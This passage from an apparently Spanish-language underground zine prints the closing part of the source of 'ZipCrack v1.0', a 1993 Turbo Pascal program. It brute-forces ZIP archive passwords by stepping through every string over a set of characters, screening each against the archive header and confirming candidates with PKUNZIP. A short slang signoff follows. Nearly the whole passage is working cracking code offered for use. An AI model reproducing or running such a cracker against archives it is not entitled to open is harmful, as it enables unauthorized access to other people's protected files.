&nbsp;&nbsp; Close(ToF); <br>
&nbsp;&nbsp; CopyFile := FALSE; <br>
&nbsp;&nbsp; Dispose(pBuf); <br>
&nbsp;&nbsp; Exit; <br>
&nbsp; end; <br>
&nbsp;until Count = 0; <br>
&nbsp;Dispose(pBuf); <br>
&nbsp;Close(FromF); <br>
&nbsp;Close(ToF); <br>
&nbsp;CopyFile := TRUE; <br>
end; </p>

<p>procedure SavePW; <br>
var SaveF : File; <br>
begin <br>
&nbsp;Assign(SaveF, SaveFN); <br>
&nbsp;Rewrite(SaveF, 1); <br>
&nbsp;BlockWrite(SaveF, MinPWLen,&nbsp; sizeof(MinPWLen)); <br>
&nbsp;BlockWrite(SaveF, MaxPWLen,&nbsp; sizeof(MaxPWLen)); <br>
&nbsp;BlockWrite(SaveF, PWCharSet, sizeof(PWCharSet)); <br>
&nbsp;BlockWrite(SaveF, PWLen,&nbsp;&nbsp;&nbsp;&nbsp; sizeof(PWLen)); <br>
&nbsp;BlockWrite(SaveF, NextPW,&nbsp;&nbsp;&nbsp; sizeof(NextPW)); <br>
&nbsp;Close(SaveF); <br>
end; </p>

<p>function IncPW : Boolean; <br>
var n : Integer; <br>
begin <br>
&nbsp;n := PWLen; <br>
&nbsp;while TRUE do begin <br>
&nbsp; if n = 0 then begin <br>
&nbsp;&nbsp; IncPW := FALSE; <br>
&nbsp;&nbsp; Exit; <br>
&nbsp; end; <br>
&nbsp; inc(NextPW[n]); <br>
&nbsp; if NextPW[n] &lt; PWCharSet.n then break <br>
&nbsp; else NextPW[n] := 0; <br>
&nbsp; dec(n); <br>
&nbsp;end; <br>
&nbsp;IncPW := TRUE; <br>
end; </p>

<p>procedure BuildPW(Escape : Boolean); <br>
var n : Integer; <br>
&nbsp;m : Integer; <br>
&nbsp;c : Char; <br>
begin <br>
&nbsp;PW[0] := Chr(PWLen); <br>
&nbsp;m := 1; <br>
&nbsp;for n := 1 to PWLen do begin <br>
&nbsp; c := PWCharSet.c[NextPW[n]]; <br>
&nbsp; if Escape and ((c = '&quot;') or (c = '\')) then begin <br>
&nbsp;&nbsp; PW[m] := '\'; <br>
&nbsp;&nbsp; inc(m); <br>
&nbsp;&nbsp; inc(PW[0]); <br>
&nbsp; end; <br>
&nbsp; PW[m] := c; <br>
&nbsp; inc(m); <br>
&nbsp;end; <br>
end; </p>

<p>function CheckAllPWs : Boolean; <br>
var NextSave : LongInt; <br>
&nbsp;Ok&nbsp;&nbsp; : Boolean; <br>
begin </p>

<p>&nbsp;NextSave := 1; </p>

<p>&nbsp;while TRUE do begin </p>

<p>&nbsp; if NextSave &lt;&gt; 0 then begin <br>
&nbsp;&nbsp; if NextSave &lt;&gt; 1 then dec(NextSave) <br>
&nbsp;&nbsp; else begin <br>
&nbsp;&nbsp;&nbsp; SavePW; <br>
&nbsp;&nbsp;&nbsp; NextSave := PWSaveInt; <br>
&nbsp;&nbsp; end; <br>
&nbsp; end; </p>

<p>&nbsp; BuildPW(FALSE); <br>
&nbsp; Ok := ZipPWCheck(PW, ZipBuf, ZDHdr.Crc32); </p>

<p>&nbsp; if Ok then begin <br>
&nbsp;&nbsp; BuildPW(TRUE); <br>
&nbsp;&nbsp; rc := ExecPkunzip('-# -t -s&quot;' + PW + '&quot; ' + ZipfilePath + ' ' +
MemberName); <br>
&nbsp;&nbsp; if rc = 0 then begin <br>
&nbsp;&nbsp;&nbsp; CheckAllPWs := TRUE; <br>
&nbsp;&nbsp;&nbsp; Exit; <br>
&nbsp;&nbsp; end; <br>
&nbsp; end; </p>

<p>&nbsp; Ok := IncPW; <br>
&nbsp; if not Ok then begin <br>
&nbsp;&nbsp; CheckAllPWs := FALSE; <br>
&nbsp;&nbsp; Exit; <br>
&nbsp; end; <br>
&nbsp;end; <br>
end; </p>

<p>begin </p>

<p>&nbsp;WriteLn('ZipCrack v1.0 Copyright 1993 by Michael A. Quinlan'); </p>

<p>&nbsp;GetInput; </p>

<p>&nbsp;if UseRamDisk then begin <br>
&nbsp; {$I-} MkDir(RamPath); {$I+} <br>
&nbsp; if IOResult &lt;&gt; 0 then <br>
&nbsp;&nbsp; ; <br>
&nbsp; if not CopyFile(PkunzipPath, RamPath + '\PKUNZIP.EXE') then begin <br>
&nbsp;&nbsp; WriteLn('Unable to copy ', PkunzipPath, ' to ', RamPath + '\PKUNZIP.EXE'); <br>
&nbsp;&nbsp; Exit; <br>
&nbsp; end <br>
&nbsp; else PkunzipPath := RamPath + '\PKUNZIP.EXE'; <br>
&nbsp; if not CopyFile(ZipfilePath, RamPath + '\' + ZipFilename) then begin <br>
&nbsp;&nbsp; WriteLn('Unable to copy ', ZipfilePath, ' to ', RamPath + '\' + ZipFilename);
<br>
&nbsp;&nbsp; Exit; <br>
&nbsp; end <br>
&nbsp; else ZipfilePath := RamPath + '\' + ZipFilename; <br>
&nbsp;end; </p>

<p>{ Validate that PKUNZIP, the Zipfile, and the member of the Zipfile are } <br>
{ still
accessible.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} </p>

<p>&nbsp;rc := ExecPkunzip('-# -v ' + ZipfilePath + ' ' + MemberName); <br>
&nbsp;if rc &lt;&gt; 0 then begin <br>
&nbsp; WriteLn('Unable to locate ', MemberName, ' in ', ZipfilePath); <br>
&nbsp; Halt(3); <br>
&nbsp;end; </p>

<p>&nbsp;Ok := ZipOpen(ZipFile, ZipfilePath, ZDEnd); <br>
&nbsp;if not Ok then Halt(3); </p>

<p>&nbsp;Ok := ZipFindFile(ZipFile, MemberName, ZDEnd, ZDHdr, ZIpHdr); <br>
&nbsp;if not Ok then Halt(3); </p>

<p>&nbsp;BlockRead(ZipFile, ZipBuf, sizeof(ZipBuf)); </p>

<p>&nbsp;if PWLen = 0 then PWLen := MinPWLen; <br>
&nbsp;Writeln('Testing passwords...'); <br>
&nbsp;for PWLen := PWLen to MaxPWLen do begin <br>
&nbsp; if CheckAllPWs then begin <br>
&nbsp;&nbsp; Writeln('Password = &quot;', PW, '&quot;'); <br>
&nbsp;&nbsp; IncPW; <br>
&nbsp;&nbsp; SavePW; <br>
&nbsp;&nbsp; Halt(0); <br>
&nbsp; end; <br>
&nbsp;end; </p>

<p>&nbsp;WriteLn('Password not found!!!'); <br>
&nbsp;Halt(1); <br>
end. <br>
--------------------cut here----------------- <br>
¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
<br>
Bueno eso fue todo viejas, ta luego, este número....una cagada, el próximo mata. <br>
&nbsp;&nbsp;&nbsp;&nbsp; Psicokiller. </p>
</body>
</html>
